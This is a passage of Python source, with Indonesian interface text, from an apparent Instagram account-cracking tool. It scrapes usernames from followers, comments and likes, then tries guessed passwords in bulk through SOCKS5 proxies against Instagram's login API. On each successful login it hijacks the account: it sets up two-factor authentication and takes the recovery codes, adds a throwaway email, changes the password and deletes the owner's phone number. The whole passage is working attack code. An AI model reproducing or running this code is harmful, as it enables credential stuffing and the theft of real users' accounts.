            data = {'av':self.AccountId(resp),'__user':'0','__a':'1','__req':'14','__hs':re.search('"haste_session":"(.*?)"', str(xxx)).group(1),'dpr':'2','__ccg':'GOOD','__rev':re.search('{"rev":(.*?)}',str(xxx)).group(1),'__hsi':re.findall('"hsi":"(\d+)"',str(xxx))[0],'__comet_req':'24','fb_dtsg':re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),'jazoest':re.findall('&jazoest=(\d+)',str(xxx))[0],'lsd':re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),'__spin_r':re.findall('"__spin_r":(\d+)', str(xxx))[0],'__spin_b':'trunk','__spin_t':re.findall('"__spin_t":(\d+)', str(xxx))[0],'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'useFXSettingsTwoFactorEnableTOTPMutation','variables':json.dumps({"input":{"client_mutation_id":re.search('{"clientID":"(.*?)"}',str(resp)).group(1),"actor_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_type":"INSTAGRAM","verification_code":code,"device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),'server_timestamps':'true','doc_id':'7032881846733167'}
            ondw = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cokie}).text
            if '"success":true' in str(ondw):
                self.info.update({'success-a2f':True})
                data.update({'fb_api_req_friendly_name':'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation','variables':json.dumps({"input":{"client_mutation_id":re.search('{"clientID":"(.*?)"}',str(resp)).group(1),"actor_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_type":"INSTAGRAM","fdid":"device_id_fetch_ig_did"}}),'doc_id':'24010978991879298'})
                head.update({'x-fb-friendly-name': 'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation'})
                reco = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cokie}).text
                if '"success":true' in str(reco):
                    kode = re.search('"recovery_codes":(.*?)}', str(reco)).group(1)
                    self.info.update({'kode-pemulihan':kode})
                else:self.info.update({'kode-pemulihan':'-'})
            else:
                self.info.update({'success-a2f':False})
                self.info.update({'kode-pemulihan':'Tidak Ada'})
        except Exception as e:
            print(e)
            self.info.update({'success-a2f':False})
            self.info.update({'kode-pemulihan':'Tidak ada'})

    def AddEmail(self, cookie):
        try:
            abcde = 'abcdefghijklmnopqrstuvwxyz'
            users = ''.join(random.choice(abcde) for i in range(5))
            email = '%s@inboxkitten.com'%(users)
            resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies={'cookie':cookie}).text
            head = self.headers_graph(resp)
            head.update({
               'Host': 'accountscenter.instagram.com',
               'x-fb-friendly-name': 'FXAccountsCenterAddContactPointMutation',
               'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            })
            data = self.data_graph(resp)
            data.update({
               'fb_api_req_friendly_name':'FXAccountsCenterAddContactPointMutation',
               'variables':json.dumps({"country":"ID","contact_point":email,"contact_point_type":"email","selected_accounts":[f"{self.AccountId(resp)}"],"family_device_id":"device_id_fetch_ig_did","client_mutation_id":"mutation_id_1700479648287"}),
               'doc_id':'6970150443042883'
            })
            xxnx = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cookie}).text
            if '"success":true' in str(xxnx):
                self.ex.update({'email':f'{email}'})
                kode, url = self.FindCode(email.split('@')[0])
                data.update({
                   'fb_api_req_friendly_name':'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation',
                   'variables':json.dumps({"contact_point":email,"contact_point_type":"email","pin_code":f"{kode}","selected_accounts":[f"{self.AccountId(resp)}"],"family_device_id":"device_id_fetch_ig_did","client_mutation_id":"mutation_id_1700481379041","contact_point_event_type":"ADD","normalized_contact_point_to_replace":""}),
                   'doc_id':'6973420842719905'
                })
                head.update({'x-fb-friendly-name': 'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation'})
                dihi = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cookie}).text
                if '"success":true' in str(dihi):self.ex.update({'di-konfirmasi':True,'Url':url})
                else:self.ex.update({'di-konfirmasi':False,'Url':url})
            else:
                self.ex.update({'di-konfirmasi':False})
                self.ex.update({'email':f'{email} Tidak Di Tambahkan','Url':None})
        except:
            self.ex.update({'di-konfirmasi':False})
            self.ex.update({'email':f'{email} Tidak Di Tambahkan','Url':None})
        return self.ex

    def FindCode(self, nama):
        while True:
           try:
               inb = requests.get(f'https://inboxkitten.com/api/v1/mail/list?recipient={nama}').text
               key = re.findall('"key":"(.*?)"', str(inb))
               xxx = re.findall('"region":"(.*?)"', str(inb))
               if len(key) > 0 or len(xxx) > 0:
                   break
           except:pass
        try:
            url = 'https://inboxkitten.com/api/v1/mail/getHtml'
            par = {'region': xxx[0], 'key':key[0]}
            pdi = {'upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
            req = requests.get(url, params=par,headers=pdi).text
            sdr = bsp(req,'html.parser')
            for yxz in sdr.find_all('td'):
                if 'Harap konfirmasi alamat email ini agar kami dapat memperbarui informasi kontak Anda. Anda mungkin diminta untuk memasukkan kode konfirmasi ini:' in str(yxz) or 'Harap konfirmasi alamat email ini' in sdr:
                    kode = re.findall('kode konfirmasi ini:(\d+)', str(yxz.text))
                    if len(kode) >0:
                       return kode[0], f'https://inboxkitten.com/inbox/{nama}/list'
                else: continue
        except:
            return None, f'https://inboxkitten.com/inbox/{nama}/list'

    def RePassword(self, cookie, paswd):
        try:
            abcd = 'abcdefghijklmnopqrstuvwxyz'
            acak = ''.join(random.choice(abcd) for _ in range(8))
            resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies={'cookie':cookie}).text
            head = self.headers_graph(resp)
            head.update({'Host': 'accountscenter.instagram.com','x-fb-friendly-name': 'useFXSettingsChangePasswordMutation','user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',})
            data = self.data_graph(resp)
            pw_old = '#PWD_BROWSER:0:{}:{}'.format(int(time.time()), paswd)
            new_pw = '#PWD_BROWSER:0:{}:{}'.format(int(time.time()), acak)
            data.update({
               'fb_api_req_friendly_name':'useFXSettingsChangePasswordMutation',
               'variables':json.dumps({"account_id":self.AccountId(resp),"account_type":"INSTAGRAM","current_password_enc":{"sensitive_string_value":pw_old},"new_password_enc":{"sensitive_string_value":new_pw},"new_password_confirm_enc":{"sensitive_string_value":new_pw},"client_mutation_id":self.ClientId(resp)}),
               'doc_id':'4872350656193366'
            })
            xnxx = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cookie}).text
            if '"success":true' in str(xnxx):
               return new_pw.split(':')[3]
            else:
               return None
        except:return None

    def GetPhone(self, cookie, status={}):
        try:
            resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies={'cookie':cookie}).text
            head = self.headers_graph(resp)
            head.update({
               'Host': 'accountscenter.instagram.com',
               'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
               'x-fb-friendly-name': 'FXAccountsCenterContactPointRootQuery'})
            data = self.data_graph(resp)
            data.update({
               'fb_api_req_friendly_name':'FXAccountsCenterContactPointRootQuery',
               'variables':json.dumps({"interface":"IG_WEB"}),
               'doc_id':'6253939098058154'
            })
            xnxx = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cookie}).text
            if '"all_contact_points"' in str(xnxx):
                pone = re.search('{"contact_point_type":"PHONE_NUMBER","normalized_contact_point":"(.*?)"', str(xnxx)).group(1)
                head.update({'x-fb-friendly-name': 'FXAccountsCenterDeleteContactPointMutation'})
                data.update({
                    'fb_api_req_friendly_name':'FXAccountsCenterDeleteContactPointMutation',
                    'variables':json.dumps({"normalized_contact_point":pone,"contact_point_type":"PHONE_NUMBER","selected_accounts":[f"{self.AccountId(resp)}"],"client_mutation_id":"mutation_id_1700749992848","family_device_id":"device_id_fetch_ig_did"}),
                    'doc_id':'6716611361758391'
                })
                haps = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cookie}).text
                if '"success":false' in haps:status.update({'Dihapus':False,'Number':pone})
                else:status.update({'Dihapus':True,'Number':pone})
            else:pass
        except Exception as e:
            status.update({'Dihapus':False,'Number':'Kesalahan'})
        return(status)

class Brute:
    def __init__(self):
        self.tw, self.ok, self.cp, self.id, self.lp = 0, 0,0, [], 0
        self.head = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}
        self.param = {'count': '200','max_id': 'KhamdihiDev','search_surface': 'follow_list_page'}
        self.dire = 'data/user/login'

    def Path(self):
        if os.path.isfile('.cokie.txt') is True:
           try:
               cokie, nama = open('.cokie.txt','r',encoding='utf-8').read().split('<=>')
               xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
               uid = re.search('ds_user_id=(\d+)', str(cokie)).group(1)
               req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':cokie}).json()['user']['full_name']
               return cokie,req
           except:self.Login()
        else:self.Login()

    def cek_day(self):
        if os.path.isfile(f'{self.dire}/day.txt') is True:
           xyz = open(self.dire+'/day.txt','r').read()
           return(xyz)
        else:
           AssetAndKey()

    def Clear(self):
        try:os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        except:pass

    def Login(self):
        self.Clear()
        self.Logos()
        ShowRich().nel(f'{P2}Login Menggunakan Cookie Akun {H2}Instagram!\n{P2}Jangan Gunakan Akun Utama Untuk Login, Gunakan Akun Baru/Ambil Dari Result Crack Ketik > {H2}res < {P2}Untuk Login Menggunakan Akun Hasil Crack')
        cokie = Input(f'   {P2}└─> {H2}')
        if 'ds_user_id' in cokie:
            try:
                xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
                uid = re.search('ds_user_id=(\d+)', str(cokie)).group(1)
                req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':cokie}).json()['user']['full_name']
                open('.cokie.txt','w').write(f'{cokie}<=>{req}')
                self.Menu()
            except Exception as e:exit(f'\n   └─> Invalid cookies {e}')
        elif 'res' in cokie or "'res'" in cokie:
            for w in open('data/user/login/OK.txt','r').read().splitlines():
                try:
                    c = re.search('csrftoken=(.*)',w).group(1)
                    x = 'csrftoken=%s'%(c)
                except: continue
                try:
                    xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
                    uid = re.search('ds_user_id=(\d+)', str(x)).group(1)
                    req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':x}).json()
                    if 'challenge' in str(req):
                       print(f'\r{END}└─> Akun {uid} Ter Logout/Cokie Kadarluarsa')
                    else:
                       if req['user']['full_name']:
                          print(f"\r{END}└─> Akun {uid} Aktif, nama {req['user']['full_name']}")
                          open('.cokie.txt','w').write(f"{x}<=>{req['user']['full_name']}")
                          self.Menu()
                       else: pass
                except Exception as e:print(e)
            exit()
        else:exit('\n   └─> User Tidak Tersedia, Cek Cokie Kamu')

    def Logos(self, sisa=None):
        list = random.choice([LIGHT_CYAN,LIGHT_WHITE,CYAN,RED,BLUE])
        ShowRich().nel(f'''
            {P2} Version  : {H2}0.03
            {P2} Status   : {H2}PREMIUM
            {P2} Expired  : {H2}2030
''')

    def Menu(self, sisa=None):
        self.Clear()
        if sisa is None:sisa=self.cek_day()
        else:pass
        self.Logos(sisa)
        cokie, fullname = self.Path()
        ShowRich().nel(f''' {P2}• Hai     : {H2}{fullname}{P2} Welcome
 {P2}• Expired : {H2}{sisa}{P2} Hari Lagi
 {P2}• Version : {H2}0.03''',True)

        ShowRich().nel(f'''  {P2}[{H2}01{P2}] Dump Users Followers  {P2}[{H2}02{P2}] Dump Users Following
  {P2}[{H2}03{P2}] Dump Users Komentar   {P2}[{H2}04{P2}] Dump Users Likes
  {P2}[{H2}05{P2}] Check Status Akun CP  {P2}[{H2}06{P2}] Check Hasil
  {P2}[{H2}07{P2}] Fitur Facebook        {P2}[{H2}08{P2}] Logout''')
        self.input_menu(cokie, sisa)

    def input_menu(self, kueh, exp):
        x = Input(f'   {P2}└─> {H2}')
        if x == '1' or x == '01' or x == '2' or x == '02':
             ShowRich().nel(f'{P2}Masukan Username Target Gunakan Tanda Koma Sebagai Pemisah Misalnya Khamdihidev,MarkZuck. {K2}Note Akun Centang Biru Tidak Bisa Di Dump!')
             uname = Input(f'   {P2}└─> {H2}')
             for users in uname.split(','):
                 getid = self.get_id(users,kueh)
             meki = False if x == '2' or x == '02' else True
             self.dump_acc(kueh, getid, meki, '')
             if len(self.id) > 0:self.methode()
             else:Input(f'   {P2}└─> {H2}Invalid Requests, Enter');self.Menu(exp)

        elif x == '3' or x == '03':
             ShowRich().nel(f'{P2} Masukan Link Postingan Vidio/Img Bebas! Gunakan Tanda Koma Sebagai Pemisah')
             link = Input(f'   {P2}└─> {H2}')
             medi = self.get_mediaid(link, kueh)
             for uid in medi:
                 self.GetUserComment(kueh, uid, '')
             self.methode()

        elif x == '4' or x == '04':
             ShowRich().nel(f'{P2} Masukan Link Postingan Vidio/Img Bebas! Gunakan Tanda Koma Sebagai Pemisah')
             link = Input(f'   {P2}└─> {H2}')
             medi = self.get_mediaid(link, kueh)
             for uid in medi:
                 self.Likes(kueh, uid)
             self.methode()

        elif x == '5' or x == '05':
             ShowRich().nel(f'{P2} Khusus Akun Checkpoint Dari Script Ini! Tidak Dapat Mengechek Hasil Dari Script Lain!')
             try:
                 file = open(f'data/user/login/CP.txt','r').read()
             except:
                 exit(f'\n   └─> Kesalahan...')
             for res in file.splitlines():
                 try:
                     user,pswd = res.split('|')[0], res.split('|')[1]
                     formatusr = '%s<=>%s'%(user,pswd)
                     if formatusr not in self.id:self.id.append(formatusr)
                 except IndexError:continue
             print(f'   └─> Terdapat {len(self.id)} account checkpoint')
             self.methode()

        elif x == '6' or x == '06':
            q = 0
            ShowRich().nel(f'''  {P2}[{H2}01{P2}] Akun OK    {P2}[{H2}02{P2}] Akun CP
  {P2}[{H2}03{P2}] Akun A2F   {P2}[{H2}00{P2}] Back Menu''')
            h = Input(f'   {P2}└─> {H2}')
            if h in ('1','01'):dir='OK.txt'
            elif h in ('2','02'):dir='CP.txt'
            elif h in ('3','03'):dir='2F.txt'
            else:self.Menu(exp)
            print(f'\n[ {GREEN}Semua Result Akun {dir} ]\n')
            for w in open(f'data/user/login/{dir}','r').read().splitlines():
                q +=1
                if dir == 'OK.txt':
                   print('\r %s%s. %s%s\n'%(GREEN,q,END,w))
                else:
                   print('\r %s%s. %s%s'%(RED,q,END,w))
            exit()
        elif x == '7' or x == '07':Facebook().Menu()
        elif x == '0' or x == '00':exit()
        else:self.Menu(exp)

    def get_id(self, ccv, cokie, list=[]):
        try:
            rsd = requests.get(f'https://www.instagram.com/{ccv}/', cookies = {'cookie': cokie}).text
            uid = re.search('"user_id":"(\d+)"', str(rsd)).group(1)
            if uid not in list:list.append(uid)
            else:pass
        except:pass
        return(list)

    def get_mediaid(self, url, cokie):
        ahmasa = []
        for x in url.split(','):
            self.head.update({'cookie':cokie})
            req = requests.get(x, headers=self.head).text
            idm = re.search('"media_id":"(\d+)"',str(req)).group(1)
            if len(idm) == 0:pass
            else:ahmasa.append(idm)
        return ahmasa

    def GetUserComment(self, cookie, media_id, max_min):
        try:
            HEADERS = {
                 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                 'content-type': 'application/x-www-form-urlencoded',
                 'x-csrftoken': re.findall('csrftoken=(.*?);',cookie)[0],
                 'cookie': cookie
            }
            response = requests.get(f'https://www.instagram.com/api/v1/media/{media_id}/comments/?can_support_threading=true&permalink_enabled=false&min_id={max_min}', headers=HEADERS).json()
            for y in response['comments']:
                format = '%s<=>%s'%(y['user']['username'], y['user']['full_name'])
                if format not in self.id:
                   self.id.append(format)
                   print(f'   └─> Success dump {len(self.id)}',end='\r')
            if 'next_min_id' in str(response):
                self.GetUserComment(cookie, media_id, response['next_min_id'])
        except Exception as e:pass

    def Likes(self, cokie, mediaid):
        try:
            self.head.update({'x-csrftoken':re.search('csrftoken=(.*?);',str(cokie)).group(1)})
            req = requests.get(f'https://www.instagram.com/api/v1/media/{mediaid}/likers/', cookies={'cookie':cokie}, headers=self.head).json()
            for data in req['users']:
                xnxz = '%s<=>%s'%(data['username'], data['full_name'])
                print(f'   └─> Success dump {len(self.id)}',end='\r')
                if xnxz not in self.id:self.id.append(xnxz)
        except:pass

    def dump_acc(self, cokie, users, type, max_id):
        xnxx = 'followers' if type is True else 'following'
        for user in users:
            try:
                self.param.update({'max_id':max_id})
                req = requests.get(f'https://www.instagram.com/api/v1/friendships/{user}/{xnxx}/', params=self.param,headers=self.head, cookies={'cookie':cokie}).json()
                for data in req['users']:
                    xnxz = '%s<=>%s'%(data['username'], data['full_name'])
                    print(f'   └─> Success dump {len(self.id)}',end='\r')
                    if xnxz not in self.id:self.id.append(xnxz)
                if 'next_max_id' in str(req):self.dump_acc(cokie, users, type, req['next_max_id'])
            except:pass
        return self.id

    def methode(self):
        ShowRich().nel(f'''  {P2}[{H2}01{P2}] Crack Use Api v1  {P2}[{H2}02{P2}] Crack Use Ajax
  {P2}[{H2}03{P2}] Crack Use Threads {P2}[{H2}04{P2}] Exit''')
        xyz = Input(f'   {P2}└─> {H2}')
        ShowRich().nel(f'''{K2}Use Koma Untuk Memilih Menu Lebih Dari Satu ex: 1,2\n
{P2}[{H2}01{P2}] Hapus Semua Data
{P2}[{H2}02{P2}] Show Akun Checkpoint
{P2}[{H2}03{P2}] Follow Akun Lu Jika Result OK''')
        all = Input(f'   {P2}└─> {H2}')
        fol,yxz,xxx = None, None, None
        for i in all.split(','):
            if i in ('3','03'):
               user = Input(f'   {P2}└─> Username Akun Lu : {H2}')
               uuid = self.get_id(user, open('.cokie.txt','r').read())
               if len(uuid) > 0:open('.idakunlu.txt','w').write(f'{uuid[0]}')
               else:print(f'\n{END}[{RED}?{END}] Username not found')
               fol = 'y'
            elif i in ('1','01'):
               yxz = 'y'
            elif i in ('2','02'):
               xxx = 'y'
            else: pass
        self.exec_malink(xyz, yxz, xxx, fol)

    def exec_malink(self, methode_login, re_data, show_off, fol):
        bulan = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
        apacb = datetime.now()
        kontl = '%s/%s/%s'%(bulan[apacb.month-1], apacb.day, apacb.year)
        ShowRich().nel(f''' {P2}• Date Now : {H2}{kontl} Jam: {apacb.hour}:{apacb.minute}
 {P2}• {K2}Proses Sedang Di Mulai, Tunggu Dan Mainkan Mode Pesawat''',True)
        print('')
        with executor(max_workers=25) as bol:
           for kontol in self.id:
               username, nama = kontol.split('<=>')
               password = Require().Password(nama)
               show_chk = True if show_off in ('ya','y') else None
               hapus_dt = True if re_data in ('ya','y') else None
               followlu = True if fol in ('y','ya') else None
               if methode_login in ('1','01'):bol.submit(self.ExecLogin, username, password, hapus_dt, show_chk, followlu)
               elif methode_login in ('2','02'):bol.submit(self.ExecAjax, username, password,hapus_dt, show_chk, followlu)
               else:bol.submit(self.ExecThreads, username, password,hapus_dt, show_chk, followlu)

        print('\n')
        print(f'{END}[{BLUE}+{END}] Total Result OK : {GREEN}{self.ok}')
        print(f'{END}[{BLUE}+{END}] Total Result CP : {RED}{self.cp}')
        print(f'{END}[{BLUE}+{END}] Total Result 2F : {RED}{self.tw}')
        print(f'{END}[{BLUE}+{END}] Total Dump User : {len(self.id)}')
        os.system('rm -rf .proxi.txt')
        sys.exit(0)

    def friends_user(self, name):
        try:
            yxz = {'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'}
            self.head.update(yxz)
            req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={name}', headers=self.head).json()['data']['user']
            ikut,mengikut,posting = req['edge_followed_by']['count'],req['edge_follow']['count'],req['edge_owner_to_timeline_media']['count']
            return(ikut,mengikut,posting)
        except:
            return('null','null','null')

    def bot_follow(self, cokie):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; G3226 Build/48.1.A.2.109; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 Instagram 160.0.0.25.132 Android (26/8.0.0; 540dpi; 1080x1758; Sony; G3226; G3226; mt6757; pt_BR; 246889074)','x-ig-app-id': '1217981644879628'}
            HD3 = {
                 "Host": "www.instagram.com",
                 "content-length": "108",
                 "sec-ch-ua": '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                 "x-ig-app-id": "1217981644879628",
                 "x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg4v5",
                 "sec-ch-ua-mobile": "?1",
                 "x-instagram-ajax": "1007404816",
                 "user-agent": headers['User-Agent'],
                 "viewport-width": "360",
                 "content-type": "application/x-www-form-urlencoded",
                 "accept": "*/*",
                 "x-requested-with": "XMLHttpRequest",
                 "x-asbd-id": "198387",
                 "sec-ch-ua-full-version-list": '"Chromium";v="110.0.5481.153", "Not A(Brand";v="24.0.0.0", "Google Chrome";v="110.0.5481.153"',
                 "x-csrftoken": re.search('csrftoken=(.*?);', str(cokie)).group(1),
                 "sec-ch-prefers-color-scheme": "light",
                 "sec-ch-ua-platform": "Android",
                 "origin": "https://www.instagram.com",
                 "sec-fetch-site": "same-origin",
                 "sec-fetch-mode": "cors",
                 "sec-fetch-dest": "empty",
                 "referer": "https://www.instagram.com/fernan_xyz/",
                 "accept-encoding": "gzip, deflate, br",
                 "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                 "cookie": cokie
            }
            Pay = {
                 "container_module":"profile",
                 "nav_chain":"PolarisProfileRoot:profilePage:1:via_cold_start",
                 "user_id":None
            }
            if os.path.isfile('.idakunlu.txt') is True:
               uid = open('.idakunlu.txt','r').read()
               Pay.update({"user_id":uid})
               API = requests.post(f'https://www.instagram.com/api/v1/friendships/create/{uid}/', headers=HD3, data=Pay)
            else:pass
        except:pass

    def ExecLogin(self, user, passwd, remove_all=None, show_change_acc=None, followlu=None, file='data/user/login/'):
        uasu = []
        requ = Require()
        prox = proxies if len(proxies) > 0 else ['184.181.217.210:4145']
        byps = requests.Session()
        kont = random.randint
        uaig = requ.UserAgent()
        curl = byps.get('https://www.instagram.com/api/v1/web/data/shared_data/', headers={'User-Agent':uaig})
        print(f'{END}[{BLUE}+{END}] {self.lp}:{len(self.id)} self.ok: {self.ok} self.cp: {self.cp} {random.choice(prox)}',end='\r');sys.stdout.flush()
        while True:
            try:
                headers = {
                    'User-Agent': uaig,
                    'X-DEVICE-ID': '%s'%(str(uuid.uuid4())),
                    'X-CM-Bandwidth-KBPS': '-1.000',
                    'X-CM-Latency': '-1.000',
                    'X-IG-App-Locale': 'id_ID',
                    'X-IG-Device-Locale': 'id_ID',
                    'X-IG-Connection-Speed': f'{random.randint(1000, 3700)}kbps',
                    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                    'X-IG-Bandwidth-TotalBytes-B': '0',
                    'X-IG-Bandwidth-TotalTime-MS': '0',
                    'X-Bloks-Version-Id': '1b030ce63a06c25f3e4de6aaaf6802fe1e76401bc5ab6e5fb85ed6c2d333e0c7',
                    'X-MID': '' if byps.cookies.get('mid') is None else byps.cookies.get('mid'),
                    'X-IG-WWW-Claim': '0',
                    'X-Bloks-Is-Layout-RTL': 'false',
                    'X-IG-Connection-Type': 'WIFI',
                    'X-IG-Capabilities': '3brTvwE=',
                    'X-IG-App-ID': '567067343352427',
                    'X-IG-Device-ID': '%s'%(str(uuid.uuid4())),
                    'X-IG-Android-ID': requ.DeviceId(),
                    'Accept-Language': 'id-ID',
                    'X-FB-HTTP-Engine': 'Liger',
                    'Host': 'i.instagram.com',
                    'Accept-Encoding': 'gzip',
                    'Connection': 'close'
                }

                payload = {
                    'phone_id':requ.poid(),
                    'adid':requ.adid(user),
                    'guid':requ.guid(),
                    'device_id':requ.DeviceId(),
                    'login_attempt_count': '0',
                    'username':user,
                    'password':'Khamdihi Dev',
                }

                cookies = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                break
            except requests.exceptions.ConnectionError: time.sleep(5); self.ExecLogin(user, passwd, remove_all, show_change_acc, followlu, file='data/user/login/')
            except:pass
        for pswd in passwd:
            if pswd:
               try:
                   payload.update({'password':pswd})
                   headers.update({'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',})
                   data = json.dumps(payload)
                   xnxx = requ.Signature(data)
                   prok = {'http': 'socks5://' + random.choice(prox)}
                   resp = byps.post('https://i.instagram.com/api/v1/accounts/login/', cookies={'cookie':cookies}, data=xnxx, headers=headers, proxies=prok)
                   if 'logged_in_user' in str(resp.text):
                       self.ok +=1
                       cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                       followers, following, postingan = self.friends_user(user)
                       if remove_all is not None:
                          try:
                              on_authen = requ.OnAuthenA2f(cookie)
                              pemulihan, secretkey, status = on_authen['kode-pemulihan'], on_authen['SecretKey'], on_authen['success-a2f']
                              aktif_ora  = 'Di Aktifkan' if status is not False else 'Tidak Aktif'
                              ganti_mail = requ.AddEmail(cookie)
                              curl, email, status_email = ganti_mail['Url'], ganti_mail['email'], ganti_mail['di-konfirmasi']
                              konfirmasi_ora = 'Di Konfirmasi' if status_email is True else ''
                              ganti_sandi = requ.RePassword(cookie, pswd)
                              dadi_ora = f'{pswd}' if ganti_sandi is None else f'{ganti_sandi}'
                              telepon = requ.GetPhone(cookie)
                              status_pon, phone = telepon['Dihapus'], telepon['Number']
                              khamdihi = f'{phone} Di Hapus' if status_pon is True else f'{phone} Tidak Di Hapus'
                              tree = Tree('\r╭ logged in user                                          ',style='green')
                              tree.add(f'Username : {user}')
                              tree.add(f'Password : {dadi_ora}')
                              tree.add(f'Followers : {followers}')
                              tree.add(f'Following : {following}')
                              tree.add(f'Postingan : {postingan}')
                              tree.add(f'Status two factor  : {aktif_ora}')
                              tree.add(f'Kode Pemulihan a2f : {pemulihan}')
                              tree.add(f'Secret Key : {secretkey}')
                              tree.add(f'Email New  : {email} {konfirmasi_ora}')
                              tree.add(f'Url Email  : {curl}')
                              tree.add(f'no telepon : {khamdihi}')
                              tree.add(f'\r{cookie}')
                              tree.add(f"{headers['User-Agent']}\n")
                              save = f'{user}|{dadi_ora}|{email}|{curl}|{secretkey}|{pemulihan}|{cookie}\n'
                          except Exception as e:
                                 tree = Tree('\r╭ logged in user                                               ',style='green')
                                 tree.add(f'Username : {user}')
                                 tree.add(f'Password : {pswd}')
                                 tree.add(f'Cookie   : {cookie}\n')
                                 save = f'{user}|{pswd}|{cookie}\n'
                       else:
                            tree = Tree('\r╭ logged in user                                          ',style='green')
                            tree.add(f'Username  : {user}')
                            tree.add(f'Password  : {pswd}')
                            tree.add(f'Followers : {followers}')
                            tree.add(f'Following : {following}')
                            tree.add(f'Postingan : {postingan}')
